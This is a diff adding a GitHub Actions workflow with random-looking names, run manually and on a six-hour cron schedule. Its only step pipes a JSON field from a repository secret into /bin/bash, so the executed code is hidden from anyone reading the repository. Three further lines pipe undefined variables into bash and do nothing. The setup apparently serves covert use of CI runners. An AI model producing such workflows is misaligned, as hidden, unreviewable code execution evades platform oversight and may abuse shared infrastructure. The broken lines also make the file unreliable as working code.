@@ -1,0 +1,21 @@
+name: ruanxiaowu19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxiaowu19871010
+        env:
+          ryji2: ${{ secrets.ryji2 }}
+        run: |
+          echo $ryji2 | jq -r .onut0419 | /bin/bash
+          echo $u4 | jq -r .dt6 | /bin/bash
+          echo $fwr8 | jq -r .ka39 | /bin/bash
+          echo $kc61559 | jq -r .nghet802 | /bin/bash
+
